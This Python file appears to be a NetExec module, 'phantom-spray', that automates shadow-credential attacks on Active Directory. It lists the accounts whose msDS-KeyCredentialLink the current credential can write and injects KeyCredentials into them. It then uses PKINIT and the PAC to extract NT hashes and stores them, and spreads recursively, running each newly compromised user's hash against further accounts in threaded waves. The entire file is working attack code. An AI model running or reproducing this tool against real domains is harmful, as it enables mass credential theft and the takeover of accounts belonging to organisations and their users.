import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from types import SimpleNamespace
from typing import Dict, FrozenSet, List, Optional, Set

from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap.ldap import MODIFY_ADD, MODIFY_DELETE

from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.paths import TMP_PATH

import importlib
ShadowCreds = importlib.import_module("nxc.modules.shadow-creds").NXCModule

try:
    from nxc.helpers.pfx import myPKINIT as _myPKINIT, GETPAC as _GETPAC
    from minikerberos.network.clientsocket import KerberosClientSocket as _KerberosClientSocket
    from minikerberos.common.target import KerberosTarget as _KerberosTarget
    from minikerberos.common.ccache import CCACHE as _MiniCCACHE
    from impacket.krb5.ccache import CCache as _ImpacketCCache
    _EXTRACT_IMPORTS_OK = True
except ImportError:
    _EXTRACT_IMPORTS_OK = False

_DH_PARAMS = {
    "p": int(
        "00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404d"
        "def9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7e"
        "dee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff",
        16,
    ),
    "g": 2,
}


class _ShadowCredsCapture(ShadowCreds):
    def write_pfx(self, certificate, device_id):
        path = super().write_pfx(certificate, device_id)
        self.last_pfx_path = path
        return path


class _ModifyCaptureConn:
    def __init__(self, real_ldap_connection):
        self._real = real_ldap_connection
        self.captured_value = None

    def modify(self, dn, changes, **kwargs):
        link = changes.get("msDS-KeyCredentialLink")
        if link:
            op, vals = link[0]
            if op == MODIFY_ADD and vals:
                self.captured_value = vals[0]
        return self._real.modify(dn, changes, **kwargs)

    def __getattr__(self, name):
        return getattr(self._real, name)


class _SerializedConn:
    def __init__(self, real_ldap_connection):
        self._real = real_ldap_connection
        self._lock = threading.Lock()

    def modify(self, *args, **kwargs):
        with self._lock:
            return self._real.modify(*args, **kwargs)

    def search(self, *args, **kwargs):
        with self._lock:
            return self._real.search(*args, **kwargs)

    def close(self):
        self._real.close()

    def __getattr__(self, name):
        return getattr(self._real, name)


class _QuietLog:
    def __init__(self, real_log):
        self._real = real_log

    def success(self, msg, **kw):   self._real.debug(msg)
    def highlight(self, msg, **kw): self._real.debug(msg)
    def display(self, msg, **kw):   self._real.debug(msg)
    def fail(self, msg, **kw):      self._real.debug(msg)
    def warning(self, msg, **kw):   self._real.debug(msg)
    def error(self, msg, **kw):     self._real.debug(msg)
    def info(self, msg, **kw):      self._real.debug(msg)
    def debug(self, msg, **kw):     self._real.debug(msg)


class _QuietContext:
    def __init__(self, real_ctx):
        self.log = _QuietLog(real_ctx.log)


class NXCModule:
    name = "phantom-spray"
    description = (
        "Shadow credential spray: enumerate writable targets via DACL, "
        "inject KeyCredentials via shadow-creds, extract NT hashes, then clean up."
    )
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    _global_target_cache: List[Dict] = []
    _global_writable_cache: Dict[str, FrozenSet[str]] = {}
    _visited_accounts: Set[str] = set()
    _cache_populated: bool = False
    _cache_lock: threading.Lock = threading.Lock()

    def options(self, context, module_options):
        """
        FILTER      Targets to include: users, computers, or all (default: all)
        MAX_PER_RUN Maximum concurrent threads per attack wave (default: 20)
        DELAY       Seconds to sleep after each successful compromise (default: 1)
        CLEANUP     Remove added KeyCredentials after extraction (default: true)
        """
        self.filter_type = module_options.get("FILTER", "all").lower()
        self.max_per_run = int(module_options.get("MAX_PER_RUN", 20))
        self.delay = float(module_options.get("DELAY", 1))
        self.cleanup = module_options.get("CLEANUP", "true").lower() == "true"

        if self.filter_type not in {"users", "computers", "all"}:
            context.log.fail(f"Invalid FILTER '{self.filter_type}': must be users, computers, or all")
            return False

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection
        self.domain = getattr(connection, "domain", None)
        self.dc_ip = getattr(connection, "dc_ip", None) or getattr(connection, "host", None)
        self.username = getattr(connection, "username", None)
        self.nthash = getattr(connection, "nthash", None)
        self.baseDN = getattr(connection, "baseDN", None) or f"DC={self.domain.replace('.', ',DC=')}"

        self.compromised_accounts: Set[str] = set()
        self._results_lock = threading.Lock()
        self._cred_connections: Dict[str, List[_SerializedConn]] = {}
        self._conn_lock = threading.Lock()

        with NXCModule._cache_lock:
            if self.username and self.username.lower() in NXCModule._visited_accounts:
                return
            if self.username:
                NXCModule._visited_accounts.add(self.username.lower())

        try:
            context.log.display(
                f"Filter: {self.filter_type} | Threads: {self.max_per_run} | "
                f"Cleanup: {'enabled' if self.cleanup else 'disabled'}"
            )
            self._breadth_first_spray()
        except Exception as e:
            context.log.error(f"Module failed: {e}")
            import traceback
            context.log.debug(traceback.format_exc())
        finally:
            self._close_all_cred_connections()

    def _discover_targets(self) -> List[Dict]:
        with NXCModule._cache_lock:
            if NXCModule._cache_populated:
                return NXCModule._global_target_cache

        obj_classes = (
            ["user"] if self.filter_type == "users"
            else ["computer"] if self.filter_type == "computers"
            else ["user", "computer"]
        )

        targets: Dict[str, Dict] = {}
        for obj_class in obj_classes:
            resp = self.connection.search(
                searchFilter=f"(objectClass={obj_class})",
                attributes=["sAMAccountName", "userAccountControl", "objectClass",
                            "distinguishedName"],
            )
            for entry in parse_result_attributes(resp):
                samname = entry.get("sAMAccountName", "")
                if not samname:
                    continue
                try:
                    uac = int(entry.get("userAccountControl") or 0)
                except (TypeError, ValueError):
                    uac = 0
                if obj_class == "user" and (uac & 2 or samname.lower() in {"administrator", "guest", "krbtgt"}):
                    continue
                key = samname.lower()
                if key not in targets:
                    targets[key] = {
                        "samname": samname,
                        "dn": entry.get("distinguishedName", ""),
                        "type": "computer" if obj_class == "computer" or samname.endswith("$") else "user",
                    }

        result = list(targets.values())
        self.context.log.display(f"Discovered {len(result)} targets")
        self.context.log.display("")
        with NXCModule._cache_lock:
            NXCModule._global_target_cache = result
            NXCModule._cache_populated = True
        return result

    # --- FIX 1: narrow the LDAP search filter so only account objects are scanned ---
    _WRITABLE_FILTER = "(|(objectClass=user)(objectClass=computer))"

    def _get_writable_targets(self, targets: List[Dict], username: str, fake_conn=None) -> List[Dict]:
        with NXCModule._cache_lock:
            if username.lower() in NXCModule._global_writable_cache:
                cached_names = NXCModule._global_writable_cache[username.lower()]
                return [t for t in targets if t["samname"].lower() in cached_names]

        writable_samnames: Set[str] = set()

        if fake_conn is not None:
            try:
                sc = fake_conn.ldap_connection.search(
                    searchBase=self.baseDN,
                    searchFilter=self._WRITABLE_FILTER,   # FIX 1
                    attributes=["distinguishedName", "allowedAttributesEffective"],
                )
                for item in sc:
                    if not isinstance(item, ldapasn1_impacket.SearchResultEntry):
                        continue
                    dn = ""
                    effective_attrs = []
                    for attr in item["attributes"]:
                        attr_type = str(attr["type"])
                        vals = [str(v) for v in attr["vals"]]
                        if attr_type == "distinguishedName":
                            dn = vals[0] if vals else ""
                        elif attr_type == "allowedAttributesEffective":
                            effective_attrs = vals
                    if "msDS-KeyCredentialLink" in effective_attrs and dn:
                        cn = dn.split(",")[0].replace("CN=", "").strip().lower()
                        writable_samnames.add(cn)
            except Exception as e:
                self.context.log.debug(f"Raw LDAP writable check failed for {username}: {e}")
        else:
            resp = self.connection.search(
                searchFilter=self._WRITABLE_FILTER,       # FIX 1
                attributes=["distinguishedName", "allowedAttributesEffective"],
            )
            for entry in parse_result_attributes(resp):
                effective_attrs = entry.get("allowedAttributesEffective", [])
                if isinstance(effective_attrs, str):
                    effective_attrs = [effective_attrs]
                if "msDS-KeyCredentialLink" in effective_attrs:
                    dn = entry.get("distinguishedName", "")
                    cn = dn.split(",")[0].replace("CN=", "").strip().lower() if dn else ""
                    writable_samnames.add(cn)

        with NXCModule._cache_lock:
            NXCModule._global_writable_cache[username.lower()] = frozenset(writable_samnames)

        writable = [
            t for t in targets
            if t["samname"].lower().rstrip("$") in writable_samnames
            or t["samname"].lower() in writable_samnames
        ]

        self.context.log.display(f"{len(writable)} shadow-cred writable target(s) for {username}")
        return writable

    def _make_ldap_connection(self, username: str, nthash: str):
        from impacket.ldap import ldap as impacket_ldap
        conn = impacket_ldap.LDAPConnection(
            f"ldap://{self.dc_ip}",
            self.baseDN,
            self.dc_ip,
        )
        conn.login(
            username,
            "",
            self.domain,
            nthash=nthash,
        )
        return conn

    _POOL_SIZE = 2

    def _get_or_bind_conn(self, username: str, nthash: str) -> _SerializedConn:
        """Return a _SerializedConn from this credential's pool (round-robin)."""
        key = username.lower()
        with self._conn_lock:
            pool = self._cred_connections.get(key)
            if pool:
                conn = pool[0]
                pool.append(pool.pop(0))
                return conn

        new_pool = []
        for _ in range(self._POOL_SIZE):
            try:
                new_pool.append(_SerializedConn(self._make_ldap_connection(username, nthash)))
            except Exception as e:
                self.context.log.debug(f"Connection pool build failed for {username}: {e}")
                break

        if not new_pool:
            raise RuntimeError(f"Could not open any LDAP connection for {username}")

        with self._conn_lock:
            existing = self._cred_connections.get(key)
            if existing:
                for c in new_pool:
                    try:
                        c.close()
                    except Exception:
                        pass
                return existing[0]
            self._cred_connections[key] = new_pool

        return new_pool[0]

    def _close_cred_connections(self, usernames) -> None:
        with self._conn_lock:
            pools = [self._cred_connections.pop(u.lower(), None) for u in usernames]
        for pool in pools:
            if pool:
                for conn in pool:
                    try:
                        conn.close()
                    except Exception:
                        pass

    def _close_all_cred_connections(self) -> None:
        with self._conn_lock:
            all_pools = list(self._cred_connections.values())
            self._cred_connections.clear()
        for pool in all_pools:
            for conn in pool:
                try:
                    conn.close()
                except Exception:
                    pass

    def _process_target(
        self, target: Dict, username: str, nthash: str, recursion_level: int
    ) -> Optional[Dict]:
        if target["samname"].lower() in self.compromised_accounts:
            return None

        if recursion_level == 0:
            conn = self.connection
        else:
            try:
                conn = SimpleNamespace(ldap_connection=self._get_or_bind_conn(username, nthash))
            except Exception as e:
                self.context.log.debug(f"[{target['samname']}] Failed to bind as {username}: {e}")
                return None

        capture = _ModifyCaptureConn(conn.ldap_connection)
        sc = _ShadowCredsCapture()
        sc.target = target["samname"]
        sc.context = _QuietContext(self.context)
        sc.connection = SimpleNamespace(ldap_connection=capture)
        sc.add(target["dn"], target["type"] == "computer")

        pfx_path = getattr(sc, "last_pfx_path", None)
        raw_value = capture.captured_value
        if not pfx_path or not pfx_path.exists():
            return None

        nt_hash = self._extract_hash(target, pfx_path)

        try:
            pfx_path.unlink(missing_ok=True)
        except Exception:
            pass
        if not nt_hash:
            return None

        if self.cleanup:
            if raw_value:
                try:
                    conn.ldap_connection.modify(
                        target["dn"],
                        {"msDS-KeyCredentialLink": [(MODIFY_DELETE, [raw_value])]},
                    )
                except Exception as e:
                    self.context.log.debug(f"[{target['samname']}] Cleanup failed: {e}")
            else:
                self.context.log.debug(f"[{target['samname']}] Cleanup skipped — no captured KeyCredential value")

        with self._results_lock:
            self.compromised_accounts.add(target["samname"].lower())

        try:
            self.connection.db.add_credential("hash", self.domain, target["samname"], nt_hash)
        except Exception as e:
            self.context.log.debug(f"[{target['samname']}] Failed to save hash to database: {e}")

        self.context.log.display(f"[L{recursion_level}] {target['samname']} compromised")
        time.sleep(self.delay)

        return {
            "target": target["samname"],
            "type": target["type"],
            "hash": nt_hash,
            "recursion_level": recursion_level,
        }

    def _extract_hash(self, target: Dict, pfx_path: Path) -> Optional[str]:
        try:
            if not _EXTRACT_IMPORTS_OK:
                self.context.log.debug(f"[{target['samname']}] Hash extraction unavailable: missing dependencies")
                return None

            pkinit = _myPKINIT.from_pfx(str(pfx_path), None, dh_params=_DH_PARAMS)
            req = pkinit.build_asreq(domain=self.domain, cname=target["samname"])

            sock = _KerberosClientSocket(_KerberosTarget(self.dc_ip))
            res = sock.sendrecv(req)

            encasrep, session_key, cipher, key = pkinit.decrypt_asrep(res.native)

            ccache_mini = _MiniCCACHE()
            ccache_mini.add_tgt(res.native, encasrep)
            ccache = _ImpacketCCache(ccache_mini.to_bytes())

            creds = ccache.getCredential(f"krbtgt/{self.domain.upper()}@{self.domain.upper()}")
            if not creds:
                self.context.log.debug(f"[{target['samname']}] No krbtgt credential found in ccache")
                return None

            tgt = creds.toTGT()
            nt_hash = _GETPAC(target["samname"], self.domain, self.dc_ip, key, tgt).dump()
            return nt_hash or None

        except Exception as e:
            self.context.log.debug(f"[{target['samname']}] Hash extraction failed: {e}")
            return None

    def _attack_wave(self, credentials_list, targets, recursion_level) -> List[Dict]:
        newly_compromised = []

        def _attack_one_credential(cred_tuple):
            username, nthash = cred_tuple
            results = []
            available = [t for t in targets if t["samname"].lower() not in self.compromised_accounts]
            if not available:
                return results
            self.context.log.display(
                f"[L{recursion_level}] Scanning as {username} ({len(available)} targets)"
            )
            with ThreadPoolExecutor(max_workers=self.max_per_run) as exe:
                fs = {
                    exe.submit(self._process_target, t, username, nthash, recursion_level): t
                    for t in available
                }
                for fut in as_completed(fs):
                    try:
                        res = fut.result()
                        if res:
                            results.append(res)
                    except Exception:
                        pass
            return results

        # All credentials at this level attack concurrently.
        # Cap the outer parallelism to avoid swamping the DC when there are
        # many freshly-compromised accounts at once.
        outer_workers = min(len(credentials_list), self.max_per_run)
        with ThreadPoolExecutor(max_workers=outer_workers) as exe:
            for partial in exe.map(_attack_one_credential, credentials_list):
                newly_compromised.extend(partial)

        return newly_compromised

    def _breadth_first_spray(self) -> List[Dict]:
        all_targets = self._discover_targets()
        if not all_targets:
            self.context.log.fail("No targets discovered")
            return []

        writable = self._get_writable_targets(all_targets, self.username)
        if not writable:
            self.context.log.fail(f"No writable targets found for {self.username}")
            return []
        self.context.log.display(f"{len(writable)} writable target(s) for {self.username}")

        all_results: List[Dict] = []
        level_creds = [(self.username, self.nthash or "")]
        current_wave_targets = writable
        recursion_level = 0

        while current_wave_targets and level_creds:
            attacking_creds = [u for u, _ in level_creds]
            new = self._attack_wave(level_creds, current_wave_targets, recursion_level)
            self._close_cred_connections(attacking_creds)
            if not new:
                break
            all_results.extend(new)

            level_creds = [
                (r["target"], r["hash"])
                for r in new
                if r["type"] == "user" and r["target"].lower() not in {"administrator", "guest", "krbtgt"}
            ]

            if level_creds:
                unowned = [t for t in all_targets if t["samname"].lower() not in self.compromised_accounts]
                if not unowned:
                    self.context.log.display("All targets compromised")
                    break

                aggregated: Dict[str, Dict] = {}

                def _check_writable(cred_tuple):
                    u, nh = cred_tuple
                    try:
                        conn = self._get_or_bind_conn(u, nh)
                    except Exception as e:
                        self.context.log.debug(f"LDAP bind failed for {u}: {e}")
                        return []
                    return self._get_writable_targets(unowned, u, fake_conn=SimpleNamespace(ldap_connection=conn))

                with ThreadPoolExecutor(max_workers=min(len(level_creds), 10)) as exe:
                    for extra in exe.map(_check_writable, level_creds):
                        for t in extra:
                            aggregated[t["samname"].lower()] = t

                current_wave_targets = list(aggregated.values())
                if current_wave_targets:
                    self.context.log.display("")
                    self.context.log.display(
                        f"[L{recursion_level + 1}] {len(current_wave_targets)} new writable target(s) found via compromised accounts"
                    )
            else:
                break

            recursion_level += 1
            if recursion_level > 100:
                self.context.log.warning("Reached recursion depth 100 — stopping")
                break

        if all_results:
            self.context.log.display("")
            self.context.log.display("--- Compromised hashes ---")
            for r in all_results:
                self.context.log.success(f"{r['target']}:{r['hash']}")
